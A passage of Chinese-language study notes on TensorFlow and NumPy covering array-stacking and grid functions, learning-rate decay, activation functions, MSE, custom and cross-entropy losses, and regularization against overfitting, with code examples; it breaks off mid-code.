<h2 id="函数3：np-vstack"><a href="#函数3：np-vstack" class="headerlink" title="函数3：np.vstack()"></a>函数3：np.vstack()</h2><p><strong>代码格式</strong>：<code>np.vstack(数组1，数组2)</code><br><strong>函数作用</strong>：将两个数组按垂直方向叠加<br><strong>示例</strong>：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line">a = np.array([<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>])    <span class="comment"># 使用np生成数组</span></span><br><span class="line">b = np.array([<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>])</span><br><span class="line">c = np.vstack((a,b)) </span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;c:\n&quot;</span>,c)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 二维数组测试：定义变量时使用逗号隔开。</span></span><br><span class="line">a = np.array([[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>], [<span class="number">1</span>, <span class="number">3</span>, <span class="number">5</span>]])</span><br><span class="line">b = np.array([[<span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>], [<span class="number">4</span>, <span class="number">7</span>, <span class="number">9</span>]])</span><br><span class="line">c = np.vstack((a, b))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;c:\n&quot;</span>, c)</span><br></pre></td></tr></table></figure>
<p><strong>运行结果</strong>：<br><img src="https://gitee.com/qidangge/picgo/raw/master/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1642487484354.png" alt="result"></p>
<h2 id="函数3：三个组合函数"><a href="#函数3：三个组合函数" class="headerlink" title="函数3：三个组合函数"></a>函数3：三个组合函数</h2><p><strong>代码格式</strong>：<code>np.mgrid[ 起始值 : 结束值 : 步长 ，起始值 : 结束值 : 步长 , … ]</code><br><strong>函数作用</strong>：生成等间隔数值点<br><strong>用法补充</strong>：<a href="http://www.manongjc.com/detail/18-fnervybjowyulpw.html">http://www.manongjc.com/detail/18-fnervybjowyulpw.html</a></p>
<p><strong>代码格式</strong>：<code>x.ravel( )</code><br><strong>函数作用</strong>：将x变为一维数组，“把 . 前变量拉直”</p>
<p><strong>代码格式</strong>：<code>np.c_[ 数组1，数组2， … ]</code><br><strong>函数作用</strong>：np.c_[ ] 使返回的间隔数值点配对</p>
<p>示例：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> tensorflow <span class="keyword">as</span> tf</span><br><span class="line"></span><br><span class="line"><span class="comment"># 生成等间隔数值点</span></span><br><span class="line">x, y = np.mgrid[<span class="number">1</span>:<span class="number">3</span>:<span class="number">1</span>, <span class="number">2</span>:<span class="number">4</span>:<span class="number">0.5</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;x:\n&quot;</span>, x)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;y:\n&quot;</span>, y)</span><br><span class="line"><span class="comment"># 将x, y拉直，并合并配对为二维张量，生成二维坐标点</span></span><br><span class="line">grid = np.c_[x.ravel(), y.ravel()]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;x.ravel():\n&quot;</span>, x.ravel())</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;y.ravel():\n&quot;</span>, y.ravel())</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;grid:\n&#x27;</span>, grid)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>运行结果：<br><img src="https://gitee.com/qidangge/picgo/raw/master/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1642488953609.png" alt="result1"><br><img src="https://gitee.com/qidangge/picgo/raw/master/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1642489031353.png" alt="result2"></p>
<p><strong>注</strong>：使用np.mgrid()生成矩阵时，如果是多维，其大小依据<strong>单个数组</strong>的大小。例如上例，x, y &#x3D; np.mgrid[1:3:1, 2:4:0.5],<strong>逗号分开维度</strong>，逗号前是一维，其大小为2；逗号后是二维，其大小为4；所以最后结果为2x4矩阵。<br>其中x沿着水平向右的方向扩展(即是：<strong>每列都相同</strong>)，观察x。y沿着垂直的向下的方向扩展(即是：<strong>每行都相同</strong>)。观察y。</p>
<h1 id="复杂度与学习率"><a href="#复杂度与学习率" class="headerlink" title="复杂度与学习率"></a>复杂度与学习率</h1><blockquote>
<p>本节内容将介绍复杂度与学习率，先通过ppt进行大体框架的整理，再通过笔记进行细致补充。</p>
</blockquote>
<h2 id="神经网络的复杂度"><a href="#神经网络的复杂度" class="headerlink" title="神经网络的复杂度"></a>神经网络的复杂度</h2><blockquote>
<p>分为：时间复杂度和空间复杂度。</p>
</blockquote>
<p>下图为例子：<br><img src="https://gitee.com/qidangge/picgo/raw/master/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1642509695759.png"></p>
<h3 id="时间复杂度"><a href="#时间复杂度" class="headerlink" title="时间复杂度"></a>时间复杂度</h3><blockquote>
<p>即模型的<strong>运算次数</strong>，可用浮点运算次数（FPLOPs, FLoating-point OPerations）或者乘加运算次数衡<br>量</p>
</blockquote>
<p><img src="https://gitee.com/qidangge/picgo/raw/master/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1642509722890.png" alt="时间复杂度"></p>
<p>注：输入层的节点没有计算过程，只是接收数据。</p>
<h3 id="空间复杂度"><a href="#空间复杂度" class="headerlink" title="空间复杂度"></a>空间复杂度</h3><blockquote>
<p>空间复杂度（访存量），严格来讲包括两部分：总<strong>参数量</strong> + 各层输出<strong>特征图</strong>。</p>
</blockquote>
<ul>
<li>参数量：模型所有带参数的层的权重参数总量；</li>
<li>特征图：模型在实时运行过程中每层所计算出的输出特征图大小。</li>
</ul>
<p><img src="https://gitee.com/qidangge/picgo/raw/master/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1642509834681.png" alt="空间复杂度"></p>
<p>注：层数不包含输入层。</p>
<h2 id="学习率策略"><a href="#学习率策略" class="headerlink" title="学习率策略"></a>学习率策略</h2><blockquote>
<p>我们先来复习一下前面提到过的损失函数与参数的更新。</p>
</blockquote>
<p><img src="https://gitee.com/qidangge/picgo/raw/master/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1642509998859.png" alt="参数更新"></p>
<p>从图片可以看到，参数更新的公式与学习率有关。所以学习率的大小对loss甚至更新后的参数w有着直接影响。<br>我们不可能一开始就设定好一个合适的学习率，但是我们可以设置一个自己变化的学习率。</p>
<h3 id="指数衰减学习率"><a href="#指数衰减学习率" class="headerlink" title="指数衰减学习率"></a>指数衰减学习率</h3><blockquote>
<p>先用较大的学习率，快速得到较优解，然后逐步减小学习率，使模型在训练后期稳定。</p>
</blockquote>
<p><code>指数衰减学习率 = 初始学习率 * 学习率衰减率^（ 当前轮数 / 多少轮衰减一次 ）</code></p>
<p>也就是说学习率会随着训练次数的增大而逐渐减小。<br><strong>使用参数</strong>：</p>
<ul>
<li>初始学习率：刚开始进行设定，作为减小的基准。</li>
<li>学习率衰减率：也是设定好初始值，而后随着指数的变化而变化。</li>
<li>当前轮数：上公式的变量，也就是x。</li>
<li>多少轮衰减一次：设定的常数</li>
</ul>
<p><strong>变化图像</strong>：<br><img src="https://gitee.com/qidangge/picgo/raw/master/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1642510616725.png" alt="学习率指数下降"></p>
<p><strong>示例</strong>：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> tensorflow <span class="keyword">as</span> tf</span><br><span class="line"></span><br><span class="line">w = tf.Variable(tf.constant(<span class="number">5</span>, dtype=tf.float32))</span><br><span class="line"></span><br><span class="line">epoch = <span class="number">40</span></span><br><span class="line">LR_BASE = <span class="number">0.2</span>  <span class="comment"># 最初学习率</span></span><br><span class="line">LR_DECAY = <span class="number">0.99</span>  <span class="comment"># 学习率衰减率</span></span><br><span class="line">LR_STEP = <span class="number">1</span>  <span class="comment"># 喂入多少轮BATCH_SIZE后，更新一次学习率</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> epoch <span class="keyword">in</span> <span class="built_in">range</span>(epoch):  <span class="comment"># for epoch 定义顶层循环，表示对数据集循环epoch次，此例数据集数据仅有1个w,初始化时候constant赋值为5，循环100次迭代。</span></span><br><span class="line">    lr = LR_BASE * LR_DECAY ** (epoch / LR_STEP)</span><br><span class="line">    <span class="keyword">with</span> tf.GradientTape() <span class="keyword">as</span> tape:  <span class="comment"># with结构到grads框起了梯度的计算过程。</span></span><br><span class="line">        loss = tf.square(w + <span class="number">1</span>)</span><br><span class="line">    grads = tape.gradient(loss, w)  <span class="comment"># .gradient函数告知谁对谁求导</span></span><br><span class="line"></span><br><span class="line">    w.assign_sub(lr * grads)  <span class="comment"># .assign_sub 对变量做自减 即：w -= lr*grads 即 w = w - lr*grads</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;After %s epoch,w is %f,loss is %f,lr is %f&quot;</span> % (epoch, w.numpy(), loss, lr))</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><strong>运行结果</strong>：<br><img src="https://gitee.com/qidangge/picgo/raw/master/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1642510776810.png" alt="result"></p>
<h3 id="分段常数衰减"><a href="#分段常数衰减" class="headerlink" title="分段常数衰减"></a>分段常数衰减</h3><h1 id="激活函数"><a href="#激活函数" class="headerlink" title="激活函数"></a>激活函数</h1><blockquote>
<p>激活函数是用来加入<strong>非线性因素</strong>的，因为线性模型的表达能力不够。引入非线性激活函数，可使深层神经网络的<strong>表达能力</strong>更加强大。</p>
</blockquote>
<p><strong>优秀的激活函数应满足</strong>：</p>
<ul>
<li><strong>非线性</strong>： 激活函数非线性时，多层神经网络可逼近所有函数</li>
<li><strong>可微性</strong>： 优化器大多用梯度下降更新参数</li>
<li><strong>单调性</strong>： 当激活函数是单调的，能保证单层网络的损失函数是凸函数</li>
<li><strong>近似恒等性</strong>： . 当参数初始化为随机小值时，神经网络更稳定</li>
</ul>
<p>激活函数输出值的范围：</p>
<ul>
<li>激活函数输出为<strong>有限值</strong>时，基于梯度的优化方法更稳定</li>
<li>激活函数输出为<strong>无限值</strong>时，建议调小学习率</li>
<li><strong>常见的激活函数</strong>有：<code>sigmoid</code>，<code>tanh</code>，<code>ReLU</code>，<code>Leaky ReLU</code>，<code>PReLU</code>，<code>RReLU</code>,<code>ELU（Exponential Linear Units）</code>，<code>softplus</code>，<code>softsign</code>，<code>softmax</code>等。</li>
</ul>
<p><img src="https://gitee.com/qidangge/picgo/raw/master/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1642596675130.png" alt="激活函数"></p>
<h2 id="sigmoid函数"><a href="#sigmoid函数" class="headerlink" title="sigmoid函数"></a>sigmoid函数</h2><p><img src="https://gitee.com/qidangge/picgo/raw/master/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1642596734081.png" alt="sigmoid"></p>
<p><strong>补充：</strong><br>sigmoid函数可应用在<em>训练过程</em>中。然而，当处理分类问题作出输出时，sigmoid却无能为力。简单地说sigmoid函数<strong>只能处理两个类</strong>，不适用于多分类问题。而softmax可以有效解决这个问题，并且softmax函数大都运用在神经网路中的<strong>最后一层网络</strong>中，使得值的区间在（0,1）之间，而不是二分类的。</p>
<h2 id="Tanh函数"><a href="#Tanh函数" class="headerlink" title="Tanh函数"></a>Tanh函数</h2><p><img src="https://gitee.com/qidangge/picgo/raw/master/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1642596779124.png" alt="Tanh"></p>
<h2 id="Relu函数"><a href="#Relu函数" class="headerlink" title="Relu函数"></a>Relu函数</h2><p><img src="https://gitee.com/qidangge/picgo/raw/master/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1642596809642.png" alt="Relu"></p>
<h2 id="Leaky-Relu函数"><a href="#Leaky-Relu函数" class="headerlink" title="Leaky Relu函数"></a>Leaky Relu函数</h2><p><img src="https://gitee.com/qidangge/picgo/raw/master/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1642596840798.png" alt="Leaky Relu"></p>
<h2 id="Softmax函数"><a href="#Softmax函数" class="headerlink" title="Softmax函数"></a>Softmax函数</h2><p><img src="https://gitee.com/qidangge/picgo/raw/master/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1642597117072.png" alt="Softmax"></p>
<h2 id="给初学者的建议"><a href="#给初学者的建议" class="headerlink" title="给初学者的建议"></a>给初学者的建议</h2><p><img src="https://gitee.com/qidangge/picgo/raw/master/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1642596906212.png" alt="建议"></p>
<p>在之后的学习里进行实践。</p>
<h1 id="损失函数（loss"><a href="#损失函数（loss" class="headerlink" title="损失函数（loss)"></a>损失函数（loss)</h1><blockquote>
<p>神经网络模型的效果及优化的目标是通过<strong>损失函数</strong>来定义的。回归和分类是监督学习中的两个大类。</p>
</blockquote>
<h2 id="均方误差损失函数"><a href="#均方误差损失函数" class="headerlink" title="均方误差损失函数"></a>均方误差损失函数</h2><blockquote>
<p>均方误差（Mean Square Error）是<strong>回归问题</strong>最常用的损失函数。<br>回归问题解决的是对<strong>具体数值的预测</strong>，比如房价预测、销量预测等。这些问题需要预测的不是一个事先定义好的类别，而是一个任意实数。</p>
</blockquote>
<p><img src="https://gitee.com/qidangge/picgo/raw/master/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1642643166836.png" alt="均方误差"></p>
<p><strong>代码使用</strong>：<code>loss_mse = tf.reduce_mean(tf.square(y_ - y))</code><br>其中y_为标签值，y为预测值。</p>
<h3 id="酸奶例子："><a href="#酸奶例子：" class="headerlink" title="酸奶例子："></a>酸奶例子：</h3><p><strong>题干</strong>：<br>预测酸奶日销量y，x1、x2是影响日销量的因素。<br>建模前，应预先采集的数据有：每日x1、x2和销量y_（即已知答案，最佳情况：产量&#x3D;销量）<br>拟造数据集X,Y_： y_ &#x3D; x1 + x2 噪声：-0.05 ~ +0.05 拟合可以预测销量的函数</p>
<p><strong>代码实现</strong>：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> tensorflow <span class="keyword">as</span> tf</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line">SEED = <span class="number">23455</span></span><br><span class="line"></span><br><span class="line">rdm = np.random.RandomState(seed=SEED)  <span class="comment"># 生成[0,1)之间的随机数</span></span><br><span class="line">x = rdm.rand(<span class="number">32</span>, <span class="number">2</span>)</span><br><span class="line">y_ = [[x1 + x2 + (rdm.rand() / <span class="number">10.0</span> - <span class="number">0.05</span>)] <span class="keyword">for</span> (x1, x2) <span class="keyword">in</span> x]  <span class="comment"># 生成噪声[0,1)/10=[0,0.1); [0,0.1)-0.05=[-0.05,0.05)</span></span><br><span class="line">x = tf.cast(x, dtype=tf.float32)</span><br><span class="line"></span><br><span class="line">w1 = tf.Variable(tf.random.normal([<span class="number">2</span>, <span class="number">1</span>], stddev=<span class="number">1</span>, seed=<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line">epoch = <span class="number">15000</span></span><br><span class="line">lr = <span class="number">0.002</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> epoch <span class="keyword">in</span> <span class="built_in">range</span>(epoch):</span><br><span class="line">    <span class="keyword">with</span> tf.GradientTape() <span class="keyword">as</span> tape:</span><br><span class="line">        y = tf.matmul(x, w1)</span><br><span class="line">        loss_mse = tf.reduce_mean(tf.square(y_ - y))</span><br><span class="line"></span><br><span class="line">    grads = tape.gradient(loss_mse, w1)</span><br><span class="line">    w1.assign_sub(lr * grads)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> epoch % <span class="number">500</span> == <span class="number">0</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;After %d training steps,w1 is &quot;</span> % (epoch))</span><br><span class="line">        <span class="built_in">print</span>(w1.numpy(), <span class="string">&quot;\n&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Final w1 is: &quot;</span>, w1.numpy())</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><strong>运行结果</strong>：<br><img src="https://gitee.com/qidangge/picgo/raw/master/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1642643525219.png" alt="result">\</p>
<p>可见，经过15000次训练，我们的参数已经得出，符合定义的条件。<br>但是这里使用均方差损失函数并不可以正确反映差距，理由如下。</p>
<h2 id="自定义损失函数"><a href="#自定义损失函数" class="headerlink" title="自定义损失函数"></a>自定义损失函数</h2><p>以前面的例子为例，如预测商品销量，预测多了，损失成本；预测少了，损失利润。如果利润与成本不相等，前方法就无法得到利益最大化。所以我们要根据实际情况自己去定义损失函数。</p>
<p><img src="https://gitee.com/qidangge/picgo/raw/master/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1642643914386.png" alt="自定义损失函数"></p>
<p>通过上图可以看到，这里我们定义了一个损失函数，其过程很明确。需要注意的是这里使用了我们前面介绍的两个函数：<code>tf.where()</code>和<code>tf.greater()</code>。</p>
<p><strong>代码示例</strong>：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> tensorflow <span class="keyword">as</span> tf</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line">SEED = <span class="number">23455</span></span><br><span class="line">COST = <span class="number">1</span></span><br><span class="line">PROFIT = <span class="number">99</span></span><br><span class="line"></span><br><span class="line">rdm = np.random.RandomState(SEED)</span><br><span class="line">x = rdm.rand(<span class="number">32</span>, <span class="number">2</span>)</span><br><span class="line">y_ = [[x1 + x2 + (rdm.rand() / <span class="number">10.0</span> - <span class="number">0.05</span>)] <span class="keyword">for</span> (x1, x2) <span class="keyword">in</span> x]  <span class="comment"># 生成噪声[0,1)/10=[0,0.1); [0,0.1)-0.05=[-0.05,0.05)</span></span><br><span class="line">x = tf.cast(x, dtype=tf.float32)</span><br><span class="line"></span><br><span class="line">w1 = tf.Variable(tf.random.normal([<span class="number">2</span>, <span class="number">1</span>], stddev=<span class="number">1</span>, seed=<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line">epoch = <span class="number">10000</span></span><br><span class="line">lr = <span class="number">0.002</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> epoch <span class="keyword">in</span> <span class="built_in">range</span>(epoch):</span><br><span class="line">    <span class="keyword">with</span> tf.GradientTape() <span class="keyword">as</span> tape:</span><br><span class="line">        y = tf.matmul(x, w1)</span><br><span class="line">        loss = tf.reduce_sum(tf.where(tf.greater(y, y_), (y - y_) * COST, (y_ - y) * PROFIT))</span><br><span class="line"></span><br><span class="line">    grads = tape.gradient(loss, w1)</span><br><span class="line">    w1.assign_sub(lr * grads)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> epoch % <span class="number">500</span> == <span class="number">0</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;After %d training steps,w1 is &quot;</span> % (epoch))</span><br><span class="line">        <span class="built_in">print</span>(w1.numpy(), <span class="string">&quot;\n&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Final w1 is: &quot;</span>, w1.numpy())</span><br><span class="line"></span><br><span class="line"><span class="comment"># 自定义损失函数</span></span><br><span class="line"><span class="comment"># 酸奶成本1元， 酸奶利润99元</span></span><br><span class="line"><span class="comment"># 成本很低，利润很高，人们希望多预测些，生成模型系数大于1，往多了预测</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><strong>运行结果</strong>：</p>
<p><img src="https://gitee.com/qidangge/picgo/raw/master/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1642644220894.png" alt="result"></p>
<p>预测结果随着利润和成本的变化而变化，符合预期。</p>
<hr>
<p>根据具体任务和目的，可设计不同的损失函数。从老师课件和讲解中对于酸奶预测损失函数的设计，我们可以得知损失函数的定义能极大影响模型预测效果。好的损失函数设计对于模型训练能够起到良好的引导作用。</p>
<p>例如，我们可以看目标检测中的多种损失函数。目标检测的主要功能是定位和识别，损失函数的功能主要就是<strong>让定位更精确，识别准确率更高</strong>。目标检测任务的损失函数由分类损失（Classificition Loss）和回归损失（Bounding Box Regeression Loss）两部分构成。近几年来回归损失主要有<br>Smooth L1 Loss(2015), IoU Loss(2016 ACM), GIoU Loss(2019 CVPR), DIoU Loss &amp; CIoU Loss(2020 AAAI)等，分类损失有交叉熵、softmax loss、logloss、focal loss等。在此由于篇幅原因不细究，有兴趣的同学可自行研究。<strong>主要是给大家一个感性的认知：需要针对特定的背景、具体的任务设计损失函数</strong>。</p>
<hr>
<h2 id="交叉熵损失函数"><a href="#交叉熵损失函数" class="headerlink" title="交叉熵损失函数"></a>交叉熵损失函数</h2><blockquote>
<p>交叉熵（Cross Entropy）表征两个概率分布之间的距离，交叉熵越小说明二者分布越接近，是<strong>分类问题</strong>中使用较广泛的损失函数。</p>
</blockquote>
<p><strong>函数作用</strong>：交叉熵损失函数CE (Cross Entropy)用于表征<strong>两个概率分布</strong>之间的距离<br><strong>求解公式</strong>：H(y_ , y) &#x3D; − ∑ 𝑦_ ∗ lny</p>
<p><strong>eg</strong>. 二分类 已知答案y_&#x3D;(1, 0) 预测y1&#x3D;(0.6, 0.4) y2&#x3D;(0.8, 0.2) 哪个更接近标准答案？<br>H1((1,0),(0.6,0.4)) &#x3D; -(1<em>ln0.6 + 0</em>ln0.4) ≈ -(-0.511 + 0) &#x3D; 0.511<br>H2((1,0),(0.8,0.2)) &#x3D; -(1<em>ln0.8 + 0</em>ln0.2) ≈ -(-0.223 + 0) &#x3D; 0.223<br>因为H1 &gt; H2，所以y2预测更准</p>
<p>在TensorFlow里，已经把这个损失函数封装好，调用方法如下：<br><code>tf.losses.categorical_crossentropy(y_，y)</code></p>
<p><strong>代码示例</strong>：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> tensorflow <span class="keyword">as</span> tf</span><br><span class="line"></span><br><span class="line">loss_ce1 = tf.losses.categorical_crossentropy([<span class="number">1</span>, <span class="number">0</span>], [<span class="number">0.6</span>, <span class="number">0.4</span>])</span><br><span class="line">loss_ce2 = tf.losses.categorical_crossentropy([<span class="number">1</span>, <span class="number">0</span>], [<span class="number">0.8</span>, <span class="number">0.2</span>])</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;loss_ce1:&quot;</span>, loss_ce1)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;loss_ce2:&quot;</span>, loss_ce2)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 交叉熵损失函数</span></span><br></pre></td></tr></table></figure>

<p><strong>运行结果</strong>：<br><img src="https://gitee.com/qidangge/picgo/raw/master/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1642644745375.png" alt="result"></p>
<h3 id="softmax与交叉熵结合"><a href="#softmax与交叉熵结合" class="headerlink" title="softmax与交叉熵结合"></a>softmax与交叉熵结合</h3><blockquote>
<p>我们要求解交叉熵损失函数，需要使得y_和y符合概率分布，这就需要使用softmax函数。</p>
</blockquote>
<p>输出先过softmax函数，再计算y与y_的交叉熵损失函数。<br>y_pro &#x3D; <code>tf.nn.softmax(y)</code><br>loss_ce1 &#x3D; <code>tf.losses.categorical_crossentropy(y_, y_pro)</code></p>
<p>也可以使用一步到位的函数：<br>loss_ce2 &#x3D;<code> tf.nn.softmax_cross_entropy_with_logits(y_, y)</code></p>
<p><strong>代码示例</strong>：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># softmax与交叉熵损失函数的结合</span></span><br><span class="line"><span class="keyword">import</span> tensorflow <span class="keyword">as</span> tf</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line">y_ = np.array([[<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>], [<span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>], [<span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>], [<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>], [<span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>]])</span><br><span class="line">y = np.array([[<span class="number">12</span>, <span class="number">3</span>, <span class="number">2</span>], [<span class="number">3</span>, <span class="number">10</span>, <span class="number">1</span>], [<span class="number">1</span>, <span class="number">2</span>, <span class="number">5</span>], [<span class="number">4</span>, <span class="number">6.5</span>, <span class="number">1.2</span>], [<span class="number">3</span>, <span class="number">6</span>, <span class="number">1</span>]])</span><br><span class="line">y_pro = tf.nn.softmax(y)</span><br><span class="line">loss_ce1 = tf.losses.categorical_crossentropy(y_, y_pro)</span><br><span class="line">loss_ce2 = tf.nn.softmax_cross_entropy_with_logits(y_, y)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;分步计算的结果:\n&#x27;</span>, loss_ce1)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;结合计算的结果:\n&#x27;</span>, loss_ce2)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 输出的结果相同</span></span><br></pre></td></tr></table></figure>
<p><strong>运行结果</strong>：<br><img src="https://gitee.com/qidangge/picgo/raw/master/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1642645243561.png" alt="result"></p>
<h1 id="欠拟合与过拟合"><a href="#欠拟合与过拟合" class="headerlink" title="欠拟合与过拟合"></a>欠拟合与过拟合</h1><p>一张图看清：<br><img src="https://gitee.com/qidangge/picgo/raw/master/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1642650746155.png"></p>
<p><strong>欠拟合的解决方法</strong>：</p>
<ul>
<li>增加输入特征项</li>
<li>增加网络参数</li>
<li>减少正则化参数</li>
</ul>
<p><strong>过拟合的解决方法</strong>：</p>
<ul>
<li>数据清洗</li>
<li>增大训练集</li>
<li>采用正则化</li>
<li>增大正则化参数</li>
</ul>
<h2 id="正则化缓解过拟合"><a href="#正则化缓解过拟合" class="headerlink" title="正则化缓解过拟合"></a>正则化缓解过拟合</h2><blockquote>
<p>正则化在损失函数中引入模型复杂度指标，利用<strong>给W加权值</strong>，弱化了训练数据的噪声（一般不正则化b）</p>
</blockquote>
<p><strong>计算公式如下</strong>：<br><img src="https://gitee.com/qidangge/picgo/raw/master/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1642650947007.png" alt="正则化"></p>
<p><strong>正则化的选择</strong>：</p>
<ul>
<li>L1正则化大概率会使很多参数变为零，因此该方法可通过稀疏参数，即减少参数的数量，<strong>降低复杂度</strong>。</li>
<li>L2正则化会使参数很接近零但不为零，因此该方法可通过减小参数值的大小<strong>降低复杂度</strong>。</li>
</ul>
<p><strong>使用方法</strong>：</p>
<ul>
<li>loss_regularization &#x3D; []</li>
<li>loss_regularization.append(tf.nn.l2_loss(w1))</li>
<li>loss_regularization.append(tf.nn.l2_loss(w2))</li>
<li>loss_regularization &#x3D; tf.reduce_sum(loss_regularization)</li>
</ul>
<blockquote>
<p>不使用L2正则化：</p>
</blockquote>
<p><strong>代码示例</strong>：<br>注：此代码请认真阅读，理解其过程。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 导入所需模块</span></span><br><span class="line"><span class="keyword">import</span> tensorflow <span class="keyword">as</span> tf</span><br><span class="line"><span class="keyword">from</span> matplotlib <span class="keyword">import</span> pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"></span><br><span class="line"><span class="comment"># 读入数据/标签 生成x_train y_train</span></span><br><span class="line">df = pd.read_csv(<span class="string">&#x27;dot.csv&#x27;</span>)</span><br><span class="line">x_data = np.array(df[[<span class="string">&#x27;x1&#x27;</span>, <span class="string">&#x27;x2&#x27;</span>]])</span><br><span class="line">y_data = np.array(df[<span class="string">&#x27;y_c&#x27;</span>])</span><br><span class="line"></span><br><span class="line">x_train = np.vstack(x_data).reshape(-<span class="number">1</span>, <span class="number">2</span>)</span><br><span class="line">y_train = np.vstack(y_data).reshape(-<span class="number">1</span>, <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">Y_c = [[<span class="string">&#x27;red&#x27;</span> <span class="keyword">if</span> y <span class="keyword">else</span> <span class="string">&#x27;blue&#x27;</span>] <span class="keyword">for</span> y <span class="keyword">in</span> y_train]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 转换x的数据类型，否则后面矩阵相乘时会因数据类型问题报错</span></span><br><span class="line">x_train = tf.cast(x_train, tf.float32)</span><br><span class="line">y_train = tf.cast(y_train, tf.float32)</span><br><span class="line"></span><br><span class="line"><span class="comment"># from_tensor_slices函数切分传入的张量的第一个维度，生成相应的数据集，使输入特征和标签值一一对应</span></span><br><span class="line">train_db = tf.data.Dataset.from_tensor_slices((x_train, y_train)).batch(<span class="number">32</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 生成神经网络的参数，输入层为2个神经元，隐藏层为11个神经元，1层隐藏层，输出层为1个神经元</span></span><br><span class="line"><span class="comment"># 用tf.Variable()保证参数可训练</span></span><br><span class="line">w1 = tf.Variable(tf.random.normal([<span class="number">2</span>, <span class="number">11</span>]), dtype=tf.float32)</span><br><span class="line">b1 = tf.Variable(tf.constant(<span class="number">0.01</span>, shape=[<span class="number">11</span>]))</span><br><span class="line"></span><br><span class="line">w2 = tf.Variable(tf.random.normal([<span class="number">11</span>, <span class="number">1</span>]), dtype=tf.float32)</span><br><span class="line">b2 = tf.Variable(tf.constant(<span class="number">0.01</span>, shape=[<span class="number">1</span>]))</span><br><span class="line"></span><br><span class="line">lr = 